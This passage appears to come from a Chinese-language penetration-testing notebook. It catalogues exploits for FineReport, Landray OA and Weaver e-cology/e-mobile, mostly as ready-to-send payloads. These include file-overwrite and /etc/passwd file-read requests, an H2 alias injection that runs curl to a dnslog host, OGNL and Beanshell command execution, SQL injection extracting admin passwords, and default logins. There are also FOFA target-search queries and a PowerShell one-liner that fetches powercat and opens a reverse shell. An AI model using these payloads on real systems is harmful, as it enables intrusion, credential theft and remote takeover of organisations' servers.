**CNVD-2018-04757 帆软报表 v8.0 任意文件读取漏洞**
- 相关文章
    - [帆软报表v8.0 Getshell漏洞分析](http://foreversong.cn/archives/1378)
    - [帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757](https://mp.weixin.qq.com/s/ae8A8PGJCtr6uS11dRpzcw)
**帆软 V9 任意文件覆盖getshell**
- 相关文章
    - [帆软 V9 getshell](https://www.o2oxy.cn/3368.html)
- POC | Payload | exp
    ```
    POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp  HTTP/1.1
    Host: 192.168.10.1
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE
    Connection: close
    Content-Type:text/xml;charset=UTF-8
    Content-Length: 74
    {"__CONTENT__":"","__CHARSET__":"UTF-8"}
    ```
**帆软报表 FineRePort 未授权远程命令执行漏洞**
- 影响版本
    - 帆软报表 FineRePortv8.0
    - 帆软报表 FineRePortv9.0
- POC | Payload | exp
    ```
    xxx.com/WebReport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin
    这个接口 打开 点查询 burp 拦截数据包 替换 post 的内容
    __parameters__={"LABEL1":"TYPE:","TYPE":"6;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL RUMCMD('curl http://xxxx.ceye.io');select msg, trace, sinfo, logtime from fr_errrecord where 1=1","LABEL3":"START_TIME:","START_TIME":"2020-08-11 00:00","LABEL5":"END_TIME:","END_TIME":"2020-08-11 16:41","LABEL7":"LIMIT:","LIMIT":2}
    ```
    ```
    POST /WebReport/ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
    Connection: close
    Content-Length: 675
    __parameters__={"LABEL1":"TYPE:","TYPE":"6;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL RUMCMD('curl http://xxxx.dnslog.cn');select msg, trace, sinfo, logtime from fr_errrecord where 1=1","LABEL3":"START_TIME:","START_TIME":"2020-08-11 00:00","LABEL5":"END_TIME:","END_TIME":"2020-08-11 16:41","LABEL7":"LIMIT:","LIMIT":2}
    ```
---
## OA
> 本类包含 OA、ERP、CRM 等
### 蓝凌
> FOFA: app="Landray-OA系统"
**相关工具**
- [yuanhaiGreg/LandrayExploit](https://github.com/yuanhaiGreg/LandrayExploit)
- [zhutougg/LandrayDES](https://github.com/zhutougg/LandrayDES) - 蓝凌OA的前后台密码的加解密工具
**蓝凌OA custom.jsp 任意文件读取漏洞**
- 相关文章
    - [蓝凌OA custom.jsp 任意文件读取漏洞](https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw)
- POC | Payload | exp
    ```
    POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
    Host:
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
    Content-Length: 42
    Content-Type: application/x-www-form-urlencoded
    Accept-Encoding: gzip
    var={"body":{"file":"file:///etc/passwd"}}
    ```
**蓝凌 OA SSRF+JNDI 远程命令执行**
- POC | Payload | exp
    ```
    配合文件读漏洞 读取 /WEB-INF/KmssConfig/admin.properties
    获取password后，使用 DES方法 解密，默认密钥为 kmssAdminKey
    访问后台地址使用解密的密码登录
    http://xxx.xxx.xxx.xxx/admin.do
    使用JNDI-Injection-Exploit 执行 getshell
    ```
**CNVD-2021-01363-蓝凌 OA-EKP 后台 SQL 注入漏洞**
- 描述
    ordeby 参数存在注入
- POC | Payload | exp
    ```
    /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true
    ```
**蓝凌 OA xmldecoder 反序列化**
- 相关文章
    - [蓝某OA前台SSRF进一步利用到RCE](https://mp.weixin.qq.com/s/fNovp4mbKIMkVdF2ywcQcQ)
    - [记一次密码读取+SSRF渗透测试](https://xz.aliyun.com/t/9950)
- POC | Payload | exp
    ```
    /sys/search/sys_search_main/sysSearchMain.do?method=editParam&fdParemNames=11&FdParameters=[shellcode]
    ```
**蓝凌 OA treexml.tmpl script 远程代码执行漏洞**
- POC | Payload | exp
    - [tangxiaofeng7/Landray-OA-Treexml-Rce](https://github.com/tangxiaofeng7/Landray-OA-Treexml-Rce)
---
### 泛微
> 官网 : https://www.weaver.com.cn/
**相关文章**
- [应用安全 - 软件漏洞 - 泛微OA漏洞汇总](https://www.cnblogs.com/AtesetEnginner/p/11558469.html)
- [泛微 e-mobile 相关漏洞](https://mp.weixin.qq.com/s/nYTXWXs-40oR41k1UsHJyw)
**相关工具**
- [z1un/weaver_exp](https://github.com/z1un/weaver_exp)
**敏感文件泄露**
- `/messager/users.data`
- `/plugin/ewe/jsp/config.jsp`
**路径遍历**
- `/plugin/ewe/admin/upload.jsp?id=11&dir=../../../`
- `/weaver/weaver.file.SignatureDownLoad?markId=1+union+select+'../ecology/WEB-INF/prop/weaver.properties'`
#### e-mobile
> fofa: app="泛微-EMobile"
**E-mobile**
```
admin/admin111
```
**E-Mobile 4.5 RCE**
```
**.**.**.**/verifyLogin.do
data：loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${@**.**.**.**.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('ipconfig').getInputStream())}
http://**.**.**.**/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
http://**.**.**.**:89/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
**.**.**.**/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
http://**.**.**.**/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
http://**.**.**.**/verifyLogin.do
data:  loginid=CasterJs&password=CasterJs&clienttype=Webclient&clientver=4.5&language=&country=&verify=${6666-2333}
```
**CNVD-2017-03561 e-mobile  fofa: app="Weaver-OA"
> fofa: app="泛微-协同办公 OA"
**指纹**
- `Set-Cookie: ecology_JSessionId=`
- `ecology`
**OA 默认口令**
```
sysadmin/1
```
**/services/MobileService?wsdl 注入**
- 相关文章
    - [泛微e-cology7.1 SOAP注入引发的血案](https://www.mrwu.red/web/1598.html)
    - [泛微协同商务系统e-cology某处SQL注入](https://www.uedbox.com/post/14232/)
**泛微OA sysinterface/codeEdit.jsp 页面任意文件上传 WooYun-2015-0155705**
- 相关文章
    - [泛微OA sysinterface/codeEdit.jsp 页面任意文件上传 WooYun-2015-0155705](http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20sysinterfacecodeEdit.jsp%20%E9%A1%B5%E9%9D%A2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html)
- POC | Payload | exp
    ```
    /sysinterface/codeEdit.jsp
    ```
**e-cology OA Beanshell 组件远程代码执行**
- 相关文章
    - [[漏洞预警]泛微e-cology OA Beanshell组件远程代码执行分析](https://mp.weixin.qq.com/s/Hr6fSOaPcTp2YaD-fPMxyg)
    - [泛微e-cology OA Beanshell组件远程代码执行漏洞复现](https://mp.weixin.qq.com/s/LpXiLukOKMfMSa8gUYBqNA)
- POC | Payload | exp
    - [jas502n/e-cology](https://github.com/jas502n/e-cology)
    ```
    /weaver/bsh.servlet.BshServlet
    ```
    ```
    eval%00("ex"%2b"ec(\"whoami\")"); 也可以换成 ex\u0065c("cmd /c dir");
    ```
    泛微多数都是 windows 环境, 反弹 shell 可以使用 pcat
    ```
    powershell IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd
    ```
**ecology8_mobile_sql_inject**
- POC | Payload | exp
    - [ecology8_mobile_sql_inject](https://github.com/orleven/Tentacle/blob/6e1cecd52b10526c4851a26249339367101b3ca2/script/ecology/ecology8_mobile_sql_inject.py)
**泛微 OA WorkflowCenterTreeData 接口注入漏洞(限 oracle 数据库)**
- POC | Payload | exp
    - [AdministratorGithub/e-cology-OA-SQL](https://github.com/AdministratorGithub/e-cology-OA-SQL)
**泛微 ecology OA 系统接口存在数据库配置信息泄露漏洞**
- 相关文章
    - [泛微ecology OA数据库配置信息泄露漏洞复现](https://mp.weixin.qq.com/s/u8GIfMBRZFAN3HANSSSgQA)
- POC | Payload | exp
    - [jas502n/DBconfigReader](https://github.com/jas502n/DBconfigReader)
    - [NS-Sp4ce/Weaver-OA-E-cology-Database-Leak](https://github.com/NS-Sp4ce/Weaver-OA-E-cology-Database-Leak)
**泛微OA V8 SQL注入漏洞**
- 描述
    泛微 OA V8 存在 SQL 注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限
- POC | Payload | exp
    ```
    /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
    ```
**泛微OA V9前台上传漏洞**
- 描述
    泛微 OA V9 存在文件上传接口导致任意文件上传, 漏洞位于: /page/exportImport/uploadOperation.jsp 文件中
- POC | Payload | exp
    ```
    POST /page/exportImport/uploadOperation.jsp HTTP/1.1
    Host: x.x.x.x
    Content-Length: 216